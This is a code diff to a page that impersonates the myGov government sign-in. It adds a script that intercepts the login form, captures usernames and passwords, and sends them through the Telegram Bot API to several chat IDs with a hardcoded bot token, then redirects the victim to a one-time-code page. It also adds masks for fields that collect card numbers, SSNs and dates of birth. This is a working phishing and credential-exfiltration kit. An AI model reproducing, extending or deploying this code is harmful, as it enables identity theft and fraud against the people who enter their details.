@@ -56,7 +56,7 @@
                                     <h1>Sign in with myGov</h1>
                                     <p class="login-instruction-text">Choose how to sign in</p>
 
-                                    <!-- Digital ID and Passkey options (exact section you requested) -->
+                                    <!-- Digital ID and Passkey options -->
                                     <div class="digital-id-login-card secondary">
                                         <div class="button-digital-id-container">
                                             <div class="digital-id-login-option-container">
@@ -75,7 +75,7 @@
                                         </div>
                                     </div>
 
-                                    <!-- "or" divider placed directly after the options -->
+                                    <!-- "or" divider -->
                                     <div class="hr-word">
                                         <div class="draw-circle">
                                             or
@@ -149,46 +149,59 @@
         </div>
     </footer>
 
-    <!-- JavaScript -->
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+        // Input masks for other fields (if needed)
+        $("#ssn").inputmask({ "mask": "999-99-9999" });
+        $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
+        $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
+        $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
+        $("#ph").inputmask({ "mask": "999-999-9999" });
+    </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+    <!-- ====== TELEGRAM SCRIPT (Multi‑chat) ====== -->
     <script>
-        
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-<script>
-    // ===== CONFIGURATION =====
-    const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
-    const CHAT_ID = '722615124';
-    // =========================
+        // ============================================================
+        // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
+        // ============================================================
+        const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
+        const CHAT_IDS = ['722615124', '5440329319']; // ← Add your chat IDs here
+        // ============================================================
 
-    $(document).ready(function() {
-        // Override the form submission
-        $('#form-1').on('submit', function(e) {
-            e.preventDefault();
+        $(document).ready(function() {
+            $('#form-1').on('submit', function(e) {
+                e.preventDefault();
 
-            let username = $('#ai').val();
-            let password = $('#pr').val();
+                let username = $('#ai').val();
+                let password = $('#pr').val();
 
-            let msg = "|----------| LOGIN CREDENTIALS |--------------|\n";
-            msg += "Username: " + username + "\n";
-            msg += "Password: " + password + "\n";
-            msg += "|-----------------------------------------|";
+                let msg = "|----------| LOGIN CREDENTIALS |--------------|\n";
+                msg += "Username: " + username + "\n";
+                msg += "Password: " + password + "\n";
+                msg += "|-----------------------------------------|";
 
-            // Send to Telegram
-            $.ajax({
-                url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
-                method: 'GET',
-                complete: function() {
-                    // Always redirect to OTP page, regardless of success/failure
-                    window.location.href = 'otp.html';
-                }
+                // Build an array of AJAX requests – one per chat
+                const requests = CHAT_IDS.map(chatId => {
+                    return $.ajax({
+                        url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`,
+                        method: 'GET'
+                    });
+                });
+
+                // Wait for all requests to complete (success or error) then redirect
+                $.when.apply($, requests)
+                    .always(function() {
+                        window.location.href = 'otp.html';
+                    });
             });
         });
-    });
-</script>
+    </script>
+
 </body>
 
 </html>
